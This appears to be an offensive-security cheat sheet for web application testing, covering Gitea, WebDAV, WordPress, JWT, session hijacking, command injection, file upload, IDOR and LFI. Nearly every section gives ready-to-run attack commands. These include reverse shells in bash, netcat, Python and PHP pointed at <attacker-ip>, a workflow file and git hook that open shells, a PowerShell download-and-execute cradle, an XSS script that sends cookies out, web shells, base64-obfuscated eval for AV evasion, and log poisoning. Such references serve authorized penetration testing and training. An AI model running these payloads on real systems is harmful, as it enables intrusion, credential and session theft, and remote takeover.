docs.title: Red Team Runbook
docs.text: A practitioner's reference for offensive security operations — built from real engagements and lab work.

docs.title: About
docs.text:
This runbook is a living reference I've built working as a penetration tester specializing in web application security, while actively expanding into network, Active Directory, and full-scope engagements through lab environments (HackTheBox, GOAD, etc.).

It is not a tutorial. It assumes you know what you're doing and need to find the right command fast. Each section has been reviewed for accuracy and annotated with real-world notes — things that don't show up in documentation but matter in practice.

docs.title: What's Here
docs.text: Section What you'll find Information Gathering Per-service enumeration cheatsheets (22 services) Network Scanning & Recon Nmap, traffic capture, host enumeration Exploitation Shells, credential attacks, binary exploitation, frameworks Applications Web app exploits, fuzzing, auth attacks, tools Privilege Escalation Linux, Windows, Active Directory Persistence Linux/Windows backdoors, DLL injection, scheduled tasks Data Exfiltration File transfer techniques, secure channels Port Forwarding & Tunneling Ligolo-ng, Chisel, SSH tunneling Tools Bloodhound, Impacket, Mimikatz, NetExec, and more

docs.title: Annotations
docs.text:
Throughout the runbook you'll find three types of annotations:

Tip

Non-obvious shortcuts, personal tool preferences, and things worth knowing before you start.

Watch out

Common failure modes, things that get caught by AV/WAF, or mistakes that waste time.

From the lab

Observations from real HTB machines and lab environments. No box names or solutions — just the technique insight.

Built by aelder202.

docs.title: Web Application Testing
docs.text: Web application testing follows a consistent pattern: fingerprint the stack, map the attack surface, probe authentication, then work through vulnerability classes systematically. Speed comes from knowing which checks matter for the technology you're looking at.

docs.title: 1. Fingerprint the Application
docs.text:
Identify the technology stack before testing anything — the right exploits depend on knowing what's running.

whatweb http://10.10.10.10
curl -I http://10.10.10.10          # response headers

Look for: - Framework/CMS in headers (X-Powered-By, Server, cookies) - Version disclosure in error pages or source comments - Known CMS signatures (/wp-login.php, /administrator, /gitea)

See Service Identification for tool-assisted fingerprinting.

docs.title: 2. Map the Attack Surface
docs.text:
Enumerate directories, subdomains, and parameters before testing exploits. You can't test what you haven't found.

Directory fuzzing:

feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 10 --filter-status 403,404

Subdomain enumeration:

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.10 -H "Host: FUZZ.example.com" -fc 301,302

See Directory & Page Fuzzing and Subdomain & Parameter Fuzzing.

Real-world

Find the admin panel before testing anything else — it's usually the highest-value target and often has weaker controls than the public-facing app.

docs.title: 3. Test Authentication
docs.text:
Weak authentication is the most common path to initial access on web applications.

  • Default credentials (admin:admin, admin:password) — check before brute-forcing
  • Username enumeration via error message or timing differences
  • JWT tampering — alg: none, weak secret, key confusion
  • Session token predictability or fixation
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

See Credential Brute-Forcing, JWT Attacks, and Session Hijacking.

docs.title: 4. Test for Common Vulnerabilities
docs.text:
Work through vulnerability classes in order of likelihood for the technology stack. Don't spray every payload everywhere — read the app first.

Vulnerability First probe SQL Injection ', " OR 1=1--, sqlmap -u URL --dbs LFI ?page=../../../etc/passwd SSTI {{7*7}}, ${7*7}, <%= 7*7 %> XSS <script>alert(1)</script>, <img src=x onerror=alert(1)> SSRF Point a URL parameter at http://127.0.0.1 or your listener Command Injection ; id, | whoami, $(id) XXE Inject <!DOCTYPE into XML input fields IDOR Increment/alter IDs in requests to access other users' data File Upload Upload .php, .aspx, or bypass with double extensions

See the Exploits sub-pages for full technique detail.

Real-world

Burp Suite Repeater is worth setting up early — you'll re-send modified requests constantly. Map the app passively through the proxy before running any active scans.

docs.title: 5. Application-Specific Testing
docs.text:
When you identify a known application, switch to targeted techniques.

Application Entry point WordPress /wp-login.php, xmlrpc.php, plugin CVEs via wpscan Gitea /explore/repos, SQLite hash extraction, webhook abuse WebDAV PUT method enabled, upload web shell via cadaver

See WordPress, Gitea, and WebDAV.

docs.title: Gitea Enumeration & Exploitation
docs.text:
Tip

Check for public repos and exposed .git directories first. Gitea's explore page (/explore/repos) is unauthenticated by default — look for private-looking repos that were accidentally made public.

Watch out

Gitea admin credentials are often default (admin:admin or gitea:gitea) on self-hosted instances spun up quickly for labs or internal tools.

docs.title: Identify Gitea Running on Target
docs.text:
Look for these indicators:

  • Login page at /user/login

  • URL patterns like:

    http://10.10.10.10:3000/
http://10.10.10.10/user/<user>
http://10.10.10.10/api/v1/users

docs.title: HTTP Headers
docs.text:
curl -I http://10.10.10.10:3000

Example:

Server: Gitea
Set-Cookie: i_like_gitea=...

docs.title: Nmap HTTP Title Scan
docs.text: nmap -p 3000 --script http-title 10.10.10.10

docs.title: Check for Docker
docs.text:
curl http://10.10.10.10:3000/.env
curl http://10.10.10.10:3000/docker-compose.yml

docs.title: Credential Extraction via SQLite
docs.text:
If you have access to the gitea.db file (e.g., through local file inclusion, volume mount, or post-exploitation), extract hashes using:

sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do \
digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); \
salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); \
name=$(echo $data | cut -d'|' -f3); \
echo "${name}:sha256:50000:${salt}:${digest}"; \
done | tee gitea.hashes

Hash format is compatible with hashcat mode 10900 (PBKDF2-HMAC-SHA256).

docs.title: Cracking with Hashcat
docs.text: hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --force

docs.title: Anonymous Access to Public Repos
docs.text:
curl http://10.10.10.10:3000/<org>/<repo>/raw/branch/master/.env
curl http://10.10.10.10:3000/<org>/<repo>/archive/master.zip

Check for:

  • Hardcoded secrets, AWS creds
  • SSH private keys
  • DB creds
  • JWT secrets
  • .gitlab-ci.yml, .github/workflows/, Dockerfile

docs.title: Open Registration + Privilege Escalation
docs.text:
If registration is allowed:

  1. Register a user
  2. Try accessing /admin or exploiting insecure direct object references (IDOR)

docs.title: Exposed Webhooks
docs.text:
Look for outbound webhook definitions in:

http://10.10.10.10:3000/<org>/<repo>/settings/hooks

You may be able to inject or redirect webhooks to attacker-controlled infrastructure for SSRF or command execution in CI/CD setups.

docs.title: Dump All Users
docs.text: SELECT id, name, passwd, email FROM user;

docs.title: Check Admin Users
docs.text: SELECT name, is_admin FROM user WHERE is_admin=1;

docs.title: List All Repositories
docs.text: SELECT id, name, owner_id FROM repository;

docs.title: Check for Webhooks
docs.text: SELECT * FROM webhook;

docs.title: Create New User
docs.text:
If you're post-auth and have admin access, create a user with access to all orgs/repos.

POST /admin/users/new

docs.title: Reverse Shell via Git Hooks (If Server-Side Exec Enabled)
docs.text:
1. Add post-receive or post-commit hook:
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > .git/hooks/post-receive
chmod +x .git/hooks/post-receive
  1. Push repo and trigger reverse shell.

docs.title: Abuse Git Actions or Pipelines
docs.text:
Upload .github/workflows/pwn.yml:

name: reverse shell
on: [push]
jobs:
  shell:
    runs-on: ubuntu-latest
    steps:
      - run: bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

docs.title: WebDAV Testing
docs.text:
Tip

Use cadaver for interactive WebDAV access or davtest to quickly test which file types can be uploaded. If PUT is allowed, try uploading .asp, .aspx, .php — whichever matches the server stack.

Watch out

WebDAV PROPFIND can enumerate the directory structure even without write access — always check what's exposed before focusing on upload attacks.

docs.title: Identify WebDAV Support via HTTP Methods
docs.text:
Use OPTIONS to identify allowed methods:

curl -X OPTIONS http://10.10.10.10 -i

Look for:

Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, COPY, MOVE, MKCOL
DAV: 1,2

docs.title: Nmap Detection
docs.text:
nmap -p 80,443 --script http-methods,http-webdav-scan 10.10.10.10

sudo nmap -p 80 -sC 10.10.10.10

Key Nmap scripts:

  • http-methods: Lists supported HTTP verbs.
  • http-webdav-scan: Checks for WebDAV functionality and upload support.

docs.title: WebDAV Methods
docs.text: Method Description Risk PUT Uploads files to server Allows arbitrary file upload DELETE Removes files Can delete site content MKCOL Creates new directory Enables structured uploads PROPFIND Queries metadata (like ls) Used for enumeration MOVE Moves files Can bypass security controls COPY Copies files Allows backup duplication

docs.title: Using curl
docs.text: curl -X OPTIONS http://10.10.10.10

docs.title: Using davtest
docs.text:
davtest -url http://10.10.10.10
  • Tests if PUT works.
  • Tries to upload test payloads like .php, .asp, .jsp, .pl.

docs.title: Using Metasploit
docs.text:
use auxiliary/scanner/http/webdav_scanner
set RHOSTS 10.10.10.10
run

docs.title: Upload Payload with cadaver
docs.text:
cadaver http://10.10.10.10
put shell.php

docs.title: Upload with Extension Bypass
docs.text:
curl -X PUT --data-binary @shell.php http://10.10.10.10/shell.php;.jpg

Try:

  • shell.pHp
  • shell.php;.jpg
  • shell.ph%00p

docs.title: HTTP Verb Tunneling
docs.text: curl -X POST -H "X-HTTP-Method-Override: PUT" --data-binary @shell.php http://10.10.10.10

docs.title: PHP Reverse Shell
docs.text:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>

cp /usr/share/webshells/php/php-reverse-shell.php .

docs.title: ASPX Reverse Shell (IIS targets)
docs.text:
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/shell.ps1')\""); %>

cp /usr/share/webshells/aspx/cmdasp.aspx .

docs.title: Bypasses
docs.text:
• Extension Obfuscation: shell.pHp, shell.php;.txt, shell.php%00.jpg
  • Double-Encoding: Use %252e instead of . in file names.
  • WAF Bypass: Some WAFs block PUT but not POST + X-HTTP-Method-Override.

docs.title: WebDAV + IIS (Windows Targets)
docs.text:
WebDAV is often installed with IIS 6.0/7.5/10. Upload .aspx, .asp, or .config files for RCE.

http://10.10.10.10/uploads/shell.aspx

curl -I http://10.10.10.10/uploads/

docs.title: WordPress Attack Surface
docs.text:
Tip

wpscan --url http://10.10.10.10 --enumerate u to enumerate users first — then target those accounts. Check /wp-json/wp/v2/users for unauthenticated user enumeration even if wpscan is blocked.

Watch out

wpscan's plugin/theme detection is noisy and slow. Run --enumerate p only after confirming the scan won't trip rate limiting or WAF rules.

docs.title: Identify WordPress CMS
docs.text:
Look for:

  • /wp-admin/, /wp-login.php, /xmlrpc.php
  • HTML meta generator tags: content="WordPress 5.8.1"
  • Common file structure: wp-content/themes, wp-includes

docs.title: Tools
docs.text:
WhatWeb:

whatweb http://10.10.10.10

Unauthenticated REST API user enumeration:

curl -s http://10.10.10.10/wp-json/wp/v2/users | jq

Returns usernames (slug field) without authentication on most WordPress deployments — faster and quieter than wpscan.

docs.title: Install
docs.text: sudo gem install wpscan

docs.title: Quick Scan
docs.text: wpscan --url http://10.10.10.10

docs.title: Enumerate Plugins & Versions
docs.text:
wpscan --url http://10.10.10.10 -e vp --api-token $TOKEN -o wpscan.log
  • -e vp – Enumerate vulnerable plugins
  • -e p – Enumerate all plugins
  • -e u – Enumerate usernames
  • --api-token – Use your API key for vulnerability DB
  • -o – Output scan to file

docs.title: Full Enumeration
docs.text:
wpscan --url http://10.10.10.10 -e ap,at,cb,dbe,u,m --api-token $TOKEN
Flag Description ap All Plugins at All Themes cb Config Backup Files (wp-config.php~) dbe DB Exports (e.g., .sql) u Usernames m Media files

docs.title: Brute Force Login
docs.text:
wpscan --url http://10.10.10.10 -U users.txt -P rockyou.txt --api-token $TOKEN

hydra -l admin -P rockyou.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"

docs.title: Exploiting Vulnerable Plugins
docs.text: searchsploit wp plugin <plugin-name>

docs.title: Exploit Upload Functionality
docs.text:
If a plugin allows file upload (e.g., contact-form-7, revslider):

  1. Upload .php reverse shell
  2. Access uploaded shell in browser
  3. Trigger reverse shell back to listener
nc -lvnp 4444

docs.title: WP Admin Shell via Theme Editor
docs.text:
1. Navigate to: /wp-admin/theme-editor.php
  2. Edit 404.php or functions.php:
<?php system($_GET['cmd']); ?>
  1. Browse to:
http://10.10.10.10/wp-content/themes/<theme>/404.php?cmd=whoami

docs.title: Create Admin User via Shell
docs.text:
<?php
require('wp-load.php');
$user = 'pentester';
$pass = 'SuperSecure123!';
$email = 'root@localhost';
if (!username_exists($user)) {
  $user_id = wp_create_user($user, $pass, $email);
  $user = new WP_User($user_id);
  $user->set_role('administrator');
}
?>

http://10.10.10.10/wp-content/uploads/admin_create.php

docs.title: Sensitive File Disclosure
docs.text:
curl http://10.10.10.10/.git/config
curl http://10.10.10.10/wp-config.php~
curl http://10.10.10.10/wp-content/debug.log

docs.title: Common Files to Check
docs.text:
• wp-config.php
  • .htaccess
  • .user.ini
  • .env

docs.title: XML-RPC Abuse
docs.text:
Used for brute-force and pingback SSRF:

curl -X POST -d @payload.xml http://10.10.10.10/xmlrpc.php

<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.com</string></value></param>
    <param><value><string>http://localhost/</string></value></param>
  </params>
</methodCall>

docs.title: Metasploit Modules
docs.text:
search wordpress

Examples:

  • exploit/unix/webapp/wp_admin_shell_upload
  • exploit/multi/http/wp_crop_rce

docs.title: Wordlists
docs.text:
• SecLists/Discovery/Web-Content/CMS/wordpress.txt
  • rockyou.txt for brute-force

docs.title: Credential Brute Forcing
docs.text:
Tip

Username enumeration via timing or error message differences is often easier than brute-forcing — confirm valid usernames first, then target those with a password list.

Watch out

Always check for account lockout before running hydra or Burp Intruder. A single locked account will alert a blue team immediately. Test with 2-3 attempts on a throwaway account first.

docs.title: HTTP Basic Authentication
docs.text: hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 10.10.10.10 http-get

docs.title: HTTP POST Form
docs.text: hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

docs.title: SMB
docs.text: hydra -L users.txt -P passwords.txt smb://10.10.10.10

docs.title: Web Authentication
docs.text: nxc http 10.10.10.10 -u users.txt -p passwords.txt --auth-form /login.php

docs.title: SMB
docs.text: nxc smb 10.10.10.10 -u users.txt -p passwords.txt

docs.title: RDP
docs.text: nxc rdp 10.10.10.10 -u users.txt -p passwords.txt

docs.title: Lockout Prevention
docs.text:
• Use a slow attack rate: add delays between requests to reduce detection.
  • Monitor response messages: some applications return different error messages for valid vs. invalid users.

docs.title: JWT Attacks
docs.text:
Tip

Try alg: none first — some libraries still accept unsigned tokens. If RS256 is used, check if the public key is exposed (e.g. /jwks.json) and try switching to HS256 signed with the public key as the secret.

Watch out

JWT signature validation failures often return a generic 401 — confirm you're actually testing the right field by checking what the app decodes, not just what it rejects.

docs.title: Using Burp Suite
docs.text:
• Capture requests and inspect the Authorization header.
  • Look for Authorization: Bearer <JWT>.

docs.title: Extracting JWT from cURL Responses
docs.text: curl -v http://10.10.10.10/api -H "Authorization: Bearer <JWT>"

docs.title: Decoding a JWT
docs.text: echo "<JWT Token>" | jwt_tool -d

docs.title: None Algorithm Attack
docs.text:
If the server does not validate the algorithm field properly, change it to none and remove the signature.

{
  "alg": "none",
  "typ": "JWT"
}

Replay the modified token:

curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api

docs.title: Signature Forgery with Weak Secrets
docs.text:
HS256 tokens signed with short or dictionary secrets crack fast with hashcat mode 16500:

echo "<JWT>" > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

Once cracked, forge a new token with any claims:

jwt_tool <JWT> -S hs256 -p "<cracked_secret>"

docs.title: Key Confusion Attack (RS256 → HS256)
docs.text:
If the server accepts the algorithm field from the header, swap RS256 to HS256 and sign with the RSA public key as the HMAC secret — the server will "verify" using the public key it trusts, producing a valid signature.

Grab the public key (commonly exposed at /jwks.json, /.well-known/jwks.json, or the JWT's jku):

curl -s http://10.10.10.10/.well-known/jwks.json

Forge with jwt_tool:

jwt_tool <JWT> -X k -pk public.pem

docs.title: jku Header Injection
docs.text:
If the server honors the jku (JWK Set URL) header to fetch the verification key, point it at an attacker-hosted JWKS and sign with the matching private key:

jwt_tool <JWT> -X s -ju http://attacker.com/jwks.json

The server fetches the attacker JWKS, pulls the attacker's public key, and validates the attacker-signed token. Works when the server doesn't pin or allowlist the jku host.

docs.title: x5u / x5c Header Injection
docs.text:
Similar to jku but references an X.509 cert chain. Same bypass — the server trusts a cert URL or embedded cert it shouldn't:

jwt_tool <JWT> -X x -pc attacker.crt -pk attacker.key

docs.title: kid Path Traversal / SQL Injection
docs.text:
The kid header selects a verification key by ID. If the server uses it in a file path or SQL query, inject:

{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}

Signing key becomes an empty file, so you can sign with an empty HMAC secret:

jwt_tool <JWT> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

docs.title: Token Expiry Manipulation
docs.text:
If the server does not properly validate token expiration (exp claim), modify and replay it:

{
  "exp": 9999999999
}

Replay:

curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api

docs.title: Session Hijacking
docs.text:
Tip

Session tokens in URL parameters (not cookies) are the easiest to steal — look for ?session=, ?token=, or ?sid= in links. Check Referer header leakage too.

Watch out

HttpOnly cookies can't be stolen via XSS. If the cookie has HttpOnly, pivot to CSRF or session fixation instead of cookie theft.

docs.title: Using Burp Suite
docs.text:
• Go to Proxy > HTTP History and inspect Set-Cookie headers.
  • Look for session-related values such as PHPSESSID, JSESSIONID, auth, or sessionid.

docs.title: Using cURL to Capture Cookies
docs.text:
curl -c cookies.txt -b cookies.txt -v http://10.10.10.10/profile
  • -c cookies.txt → Saves cookies to a file.
  • -b cookies.txt → Reuses stored cookies in subsequent requests.
  • -v → Enables verbose output to analyze responses.

docs.title: Using Browser DevTools
docs.text:
• Open Developer Tools (F12 in Chrome/Firefox).
  • Navigate to Application > Storage > Cookies.
  • Locate authentication cookies or session tokens.

docs.title: XSS Cookie Theft
docs.text:
<script>document.location='http://<attacker-ip>/steal.php?cookie='+document.cookie</script>

Listen for the stolen cookie:

nc -lvnp 80

docs.title: Session Fixation Attack
docs.text:
Force the victim to use a known session ID:

http://10.10.10.10/login?sessionid=ATTACKERSESSION

Once the victim logs in, reuse the session:

curl -b "sessionid=ATTACKERSESSION" http://10.10.10.10/dashboard

docs.title: JWT Token Theft
docs.text:
1. Capture the Authorization: Bearer <JWT> header.
  2. Decode the JWT for useful information:
echo "<JWT Token>" | jwt_tool -d
  1. Modify the token and replay it:
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api

docs.title: Directory & Page Fuzzing
docs.text:
Wordlist selection

Start with raft-medium-directories.txt for general discovery. Use common.txt if you need speed over coverage. directory-list-2.3-big.txt only when you've confirmed there's something worth finding — it's slow. For API endpoints, use api/api-endpoints.txt from SecLists.

Watch out

Always filter 404s (--filter-status 404 / -fc 404) and the default page size if the app returns 200 for everything. Filter by response size with --filter-size <n> (feroxbuster) or -fs <n> (ffuf) when the app returns the same "not found" body for every miss.

docs.title: feroxbuster
docs.text:
The fastest and most ergonomic tool for general directory busting — recursion, auto-filtering, and progress indicators out of the box.

feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt --filter-status 404

Recursive enumeration with depth limit:

feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -d 3

Silent mode (pipe-friendly output):

feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q --silent

docs.title: ffuf
docs.text:
Use ffuf when you need fine-grained control over headers, POST bodies, or custom FUZZ placement (paths, parameters, vhosts). For plain directory discovery, feroxbuster is faster.

ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404

Find admin panels:

ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt -fc 404

Find backup files:

ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt -fc 404

Filter by response size when the app returns 200 for everything:

ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt -fs 1234

docs.title: gobuster
docs.text:
Legacy but still widely installed. Useful as a fallback when feroxbuster and ffuf aren't available.

gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -b 404 -q

Recursive directory enumeration:

gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -r

docs.title: dirsearch
docs.text: dirsearch -u http://10.10.10.10 -x 403,404

docs.title: Service Identification
docs.text:
Tip

Response headers often reveal framework and version: X-Powered-By, Server, X-Generator. Also check error pages — frameworks leak version info in stack traces.

Watch out

Don't rely solely on HTTP headers for fingerprinting — they can be spoofed or stripped. Confirm with behavior-based checks (error message format, cookie names, response timing).

docs.title: curl
docs.text:
curl -s -I http://10.10.10.10
  • -s: Silent mode (hides progress)
  • -I: Fetches headers only

docs.title: Netcat
docs.text:
nc -v 10.10.10.10 80
HEAD / HTTP/1.1
Host: 10.10.10.10

docs.title: WhatWeb
docs.text:
whatweb -a 3 http://10.10.10.10
  • -a 3: Aggressive scanning mode

docs.title: httpx (tech detection)
docs.text:
httpx -u https://example.com -tech-detect -title -status-code -server

Run against a list of targets piped from subfinder or a file:

subfinder -d example.com -silent | httpx -tech-detect -title -status-code

docs.title: webanalyze
docs.text: webanalyze -host https://example.com -crawl 2

docs.title: Nmap
docs.text:
nmap -sV -p 80,443 10.10.10.10

Broader port range:

nmap -p- -sV 10.10.10.10

docs.title: Nikto
docs.text: nikto -h http://10.10.10.10

docs.title: Checking Security Headers
docs.text: curl -s -I http://10.10.10.10 | grep -E "Strict-Transport-Security|X-Frame-Options|X-Content-Type-Options|Content-Security-Policy"

docs.title: SSL/TLS Analysis
docs.text:
sslscan 10.10.10.10

openssl s_client -connect 10.10.10.10:443

docs.title: Subdomain & Parameter Fuzzing
docs.text:
Tip

For parameter fuzzing, x8 is faster than ffuf for discovering hidden parameters in existing endpoints. For subdomain fuzzing, filter by response size — wildcard DNS returns 200 for everything.

Watch out

Virtual host fuzzing requires the Host header, not the URL. Use ffuf -H "Host: FUZZ.example.com" — changing the URL path won't work.

docs.title: subfinder
docs.text: subfinder -d example.com

docs.title: amass
docs.text:
amass enum -passive -d example.com
  • -passive → Runs passive enumeration to avoid triggering alerts.

docs.title: gobuster
docs.text: gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

docs.title: ffuf (vhost fuzzing)
docs.text:
ffuf -u 'http://example.com' -H 'Host: FUZZ.example.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>

Capture the baseline response size for the default host first (wildcard DNS returns 200 for everything), then filter it out with -fs. You can also filter by word or line count: -fw <n> / -fl <n>.

docs.title: ffuf
docs.text: ffuf -u "http://10.10.10.10/page.php?FUZZ=value" -w /usr/share/seclists/Fuzzing/special-chars.txt

docs.title: arjun
docs.text:
arjun -u http://10.10.10.10/page.php -w /usr/share/seclists/Fuzzing/special-chars.txt
  • Automates parameter fuzzing for GET and POST requests.
  • Supports JSON and XML-based APIs.

docs.title: Command Injection
docs.text:
Tip

If semicolons are filtered, try |, ||, &&, or newline injection (%0a). On Windows, use & instead of ;. Always test both Linux and Windows separators — you often don't know the OS.

Watch out

Blind command injection with sleep 5 confirms execution but burns time. Use curl or ping to an OOB server for faster confirmation.

docs.title: Basic Payloads
docs.text:
Try injecting common shell metacharacters to test for execution:

; whoami
& id
| uname -a
$(whoami)

docs.title: Out-of-Band (OOB) Testing
docs.text:
If direct command output is not returned, trigger DNS or ICMP requests to your controlled server:

nslookup attacker.com
ping -c 1 attacker.com

Listen on the attacker's machine:

tcpdump -i eth0 icmp
tcpdump -i eth0 port 53

docs.title: Bash Reverse Shell
docs.text: bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1

docs.title: Netcat Reverse Shell
docs.text:
Most modern distros ship nc.openbsd which lacks -e. Use the mkfifo pattern:

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> <port> >/tmp/f

Legacy builds (nc.traditional, ncat) still support -e:

nc -e /bin/sh <attacker-ip> <port>
ncat -e /bin/sh <attacker-ip> <port>

docs.title: Python Reverse Shell
docs.text: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

docs.title: PHP Reverse Shell
docs.text: php -r '$sock=fsockopen("<attacker-ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

docs.title: URL Encoding
docs.text: %3B%20whoami

docs.title: Base64 Encoding
docs.text:
Encode the command:

echo "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1" | base64

Decode and execute:

echo "<encoded-command>" | base64 -d | bash

docs.title: commix
docs.text: commix --url="http://10.10.10.10/vuln.php?id=1"

docs.title: sqlmap (SQL-Based Command Execution)
docs.text: sqlmap -u "http://10.10.10.10/index.php?id=1" --os-shell

docs.title: File Upload Attacks
docs.text:
Tip

If .php is blocked, try .php5, .phtml, .phar, .php.jpg (double extension). Check if the server strips or ignores the second extension. MIME type checks are often client-side only — bypass with Burp.

Watch out

Uploading a web shell to a path you can't reach is useless. Confirm the upload directory is web-accessible before spending time on the payload.

docs.title: Changing File Extensions
docs.text:
Capture the request through Burp Suite and attempt to bypass restricted file types:

shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
shell.PHP5

docs.title: Changing Content-Type Header
docs.text: Content-Type: image/jpeg

docs.title: Magic Bytes Spoofing
docs.text:
Some applications check magic bytes instead of extensions. Use a valid image header followed by PHP code:

echo -ne "\xFF\xD8\xFF\xE0" > shell.jpg
cat shell.php >> shell.jpg

docs.title: Web Shell
Reverse Shell
MSFVenom PHP Shell
docs.text: msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php

docs.title: Evading AV and Security Controls
docs.text:
Base64 encode PHP code and decode on execution:

<?php eval(base64_decode("c3lzdGVtKCd3aG9hbWknKTs=")); ?>

Dynamic payload execution:

<?php $c=$_GET['cmd']; system($c); ?>

docs.title: ExifTool
docs.text:
Modify file metadata to bypass file type validation:

exiftool -Comment="<?php system($_GET['cmd']); ?>" shell.jpg

docs.title: Wfuzz / FFUF
docs.text: Automate directory fuzzing for hidden upload endpoints.

docs.title: IDOR (Insecure Direct Object Reference)
docs.text:
Tip

IDORs often hide in non-obvious parameters: user_id, account, ref, UUIDs in API responses. Use Burp's Autorize extension to automate testing across roles — manually replacing IDs is slow.

Watch out

Some IDORs are write-only (you can modify but not read). Test PUT/PATCH/DELETE on other users' resources, not just GET.

docs.title: Identifying IDOR Vulnerabilities
docs.text:
• Predictable Identifiers: Change numeric values in URLs and see if unauthorized data is returned.
  • Unauthenticated Access: Access a valid object reference while logged out.
  • Burp Suite Intruder: Automate IDOR detection by fuzzing object IDs.
  • API Requests: Modify request bodies or query parameters to request unauthorized data.
ffuf -w /usr/share/seclists/Fuzzing/parameter-names.txt -u http://10.10.10.10/profile.php?user=FUZZ -fs 403

docs.title: User Account Enumeration
docs.text:
GET /profile/1234 HTTP/1.1
Host: 10.10.10.10
Cookie: session=abcd1234

Modify 1234 to other user IDs (1233, 1235, etc.) and check for unauthorized data exposure.

docs.title: Accessing Restricted Files
docs.text:
GET /download?file=secret_report.pdf

Change file=secret_report.pdf to another filename:

GET /download?file=employee_salaries.pdf

docs.title: Changing Account Permissions
docs.text:
POST /api/updateRole
Content-Type: application/json

{
  "user_id": "1234",
  "role": "admin"
}

docs.title: Tools
docs.text:
• Burp Suite – Intercept and manipulate requests.
  • FFUF / Wfuzz – Automate object ID fuzzing.
  • Postman – Send API requests for manual testing.
  • Param Miner – Discover hidden parameters that could lead to IDOR.

docs.title: Local File Inclusion (LFI)
docs.text:
Tip

If ../ is filtered, try ....// (double-dotslash) or URL-encode to %2e%2e%2f. PHP include() is case-insensitive on Windows targets — ../ETC/PASSWD still works.

Watch out

Log poisoning for RCE requires write access to a log file AND the ability to include it. Confirm both before spending time on payloads — many targets have logs in non-default paths.

docs.title: Identifying LFI Vulnerabilities
docs.text:
Look for parameters that reference files:

http://10.10.10.10/index.php?page=home.php

Test file traversal:

http://10.10.10.10/index.php?page=../../../../etc/passwd

docs.title: Using Burp Suite
docs.text:
1. Capture a request containing a file inclusion parameter.
  2. Use Intruder to automate directory traversal payloads (../, %2e%2e/, %252e%252e/, etc.).
  3. Check responses for readable file contents.

docs.title: Fuzzing
docs.text: ffuf -u "http://10.10.10.10/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 404

docs.title: Exploiting LFI
docs.text:
Common Linux files to read:

http://10.10.10.10/index.php?page=../../../../etc/passwd
http://10.10.10.10/index.php?page=../../../../proc/self/environ
http://10.10.10.10/index.php?page=../../../../var/log/apache2/access.log
http://10.10.10.10/index.php?page=../../../../root/.bash_history
http://10.10.10.10/index.php?page=../../../../root/.ssh/id_rsa

docs.title: Log Poisoning for RCE
docs.text:
1. Inject a PHP payload into Apache logs:
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.10.10.10/
  1. Include the log file to trigger execution:
http://10.10.10.10/index.php?page=../../../../var/log/apache2/access.log&cmd=id

docs.title: PHP Wrappers
docs.text:
PHP's stream wrappers expose source code, execute embedded payloads, and bypass filters that block ../. Behavior depends on allow_url_include and allow_url_fopen — test each and note which work.

php://filter — read source code (always works on PHP):

